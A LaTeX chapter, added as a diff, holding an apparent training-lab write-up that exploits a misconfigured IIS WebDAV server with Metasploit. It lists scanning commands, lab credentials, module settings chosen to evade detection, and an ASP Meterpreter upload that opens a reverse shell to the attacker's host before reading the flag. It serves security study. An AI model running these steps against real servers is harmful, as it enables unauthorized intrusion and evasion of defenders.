@@ -1,0 +1,166 @@
+\chapter{Lab: IIS WebDAV Exploitation with Metasploit}
+\label{lab:webdav_metasploit}
+
+\begin{notebox}[Lab objective]
+Exploit a misconfigured Microsoft IIS WebDAV endpoint using Metasploit's
+\ic{iis\_webdav\_upload\_asp} module to upload an ASP Meterpreter payload,
+gain a reverse shell session, and retrieve the flag.
+\end{notebox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Environment}
+\begin{itemize}
+  \item \textbf{Attacker:} Kali Linux (INE lab environment)
+  \item \textbf{Target:} \ic{demo.ine.local} --- \ic{10.2.28.172}
+  \item \textbf{Tools:} \ic{ping}, \ic{nmap}, \ic{davtest}, Metasploit Framework
+  \item \textbf{Credentials:} \ic{bob:password\_123321} (provided by lab)
+\end{itemize}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Step 1 --- Confirm Host is Reachable}
+
+\begin{termbox}
+ping -c 1 demo.ine.local
+\end{termbox}
+
+Host confirmed alive. IP noted as \ic{10.2.28.172}.
+
+\screenshot{assets/images/Screenshot_2026-04-12_at_5.05.40_PM.png}{Ping confirming demo.ine.local is reachable}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Step 2 --- Initial Scan}
+
+\begin{termbox}
+nmap -f 10.2.28.172
+\end{termbox}
+
+Used packet fragmentation (\ic{-f}) for the initial broad scan to quickly map
+the attack surface. Found HTTP on port 80. SMB and RDP also visible but the lab
+context is IIS + WebDAV so I focused on port 80.
+
+\screenshot{assets/images/Screenshot_2026-04-12_at_5.17.34_PM.png}{Initial fragmented scan results showing open ports}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Step 3 --- HTTP Enumeration}
+
+\begin{termbox}
+nmap --script http-enum -sV -p 80 10.2.28.172
+\end{termbox}
+
+\textbf{Key findings:}
+\begin{itemize}
+  \item Microsoft IIS 10.0 confirmed on port 80
+  \item \ic{/webdav/} returning \textbf{401 Unauthorized} --- endpoint exists,
+        requires credentials
+\end{itemize}
+
+\screenshot{assets/images/Screenshot_2026-04-12_at_6.15.32_PM.png}{http-enum revealing /webdav/ endpoint with 401 response}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Step 4 --- Validate WebDAV Attack Path with davtest}
+
+\begin{termbox}
+davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
+\end{termbox}
+
+\textbf{What I confirmed:}
+\begin{itemize}
+  \item File upload via PUT: working
+  \item ASP file execution: confirmed
+  \item Attack path validated --- proceed with Metasploit ASP upload module
+\end{itemize}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Step 5 --- Start Metasploit and Find the Module}
+
+\begin{termbox}
+service postgresql start && msfconsole
+
+# Search for IIS WebDAV upload modules
+search iis upload
+# Selected: exploit/windows/iis/iis_webdav_upload_asp (index 1)
+
+use 1
+show options
+\end{termbox}
+
+\screenshot{assets/images/Screenshot_2026-04-13_at_2.18.45_PM.png}{Metasploit search results showing iis\_webdav\_upload\_asp module}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Step 6 --- Configure the Module}
+
+\begin{termbox}
+set RHOST 10.2.28.172
+set HttpUsername bob
+set HttpPassword password_123321
+set PATH /webdav/metasploit%RAND%.asp    # Random filename to avoid detection
+# LHOST was already set from earlier: 10.10.41.14
+\end{termbox}
+
+\textbf{Parameter rationale:}
+\begin{itemize}
+  \item \ic{RHOST} --- target IP from the nmap phase
+  \item \ic{HttpUsername/HttpPassword} --- credentials confirmed working with davtest
+  \item \ic{PATH} --- upload path within the WebDAV directory; \ic{\%RAND\%}
+        generates a random filename
+  \item \ic{LHOST} --- my Kali VPN interface (must be VPN, not loopback)
+\end{itemize}
+
+\screenshot{assets/images/Screenshot_2026-04-13_at_2.28.42_PM.png}{Module options configured with credentials, RHOST, and PATH}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Step 7 --- Execute the Exploit}
+
+\begin{termbox}
+exploit
+\end{termbox}
+
+\textbf{What happened step by step:}
+\begin{enumerate}
+  \item Reverse TCP handler started on \ic{10.10.41.14:1234}
+  \item Module checked for existing file at the random path
+  \item Uploaded 612,581 bytes to \ic{/webdav/metasploit73788480.txt}
+  \item Moved the file to \ic{metasploit73788480.asp}
+  \item Executed the ASP payload by requesting the URL
+  \item Stage sent (176,198 bytes)
+  \item \textbf{Meterpreter session 1 opened} at \ic{10.2.28.172:49836}
+\end{enumerate}
+
+\screenshot{assets/images/Screenshot_2026-04-13_at_2.31.44_PM.png}{Exploit running --- upload, rename, execute, and Meterpreter session opened}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Step 8 --- Post-Exploitation and Flag}
+
+\begin{termbox}
+meterpreter > cd /
+meterpreter > ls
+# flag.txt visible at C:\
+meterpreter > cat flag.txt
+\end{termbox}
+
+\screenshot{assets/images/Screenshot_2026-04-13_at_10.15.16_PM.png}{Meterpreter session listing C:\ with flag.txt visible}
+
+\screenshot{assets/images/Screenshot_2026-04-13_at_10.19.55_PM.png}{cat flag.txt output --- flag retrieved and lab objective complete}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Result}
+
+Flag retrieved. 1 of 1 flags captured. Lab complete.
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Key Learning}
+
+\begin{takebox}
+\begin{itemize}
+  \item The Metasploit module handles the entire chain automatically: upload,
+        rename from \ic{.txt} to \ic{.asp}, trigger execution, and catch the
+        reverse shell. Understanding what it does manually (Lab~\ref{lab:webdav_manual})
+        makes this module make sense.
+  \item davtest before the module confirmed the attack path was viable. Running
+        the exploit blind wastes time and creates noise on the server.
+  \item The \ic{\%RAND\%} in the path means each run uses a different filename,
+        which helps evade signature-based detection.
+  \item LHOST must be the VPN interface. If the target cannot reach back to the
+        attacker, the session never opens.
+\end{itemize}
+\end{takebox}
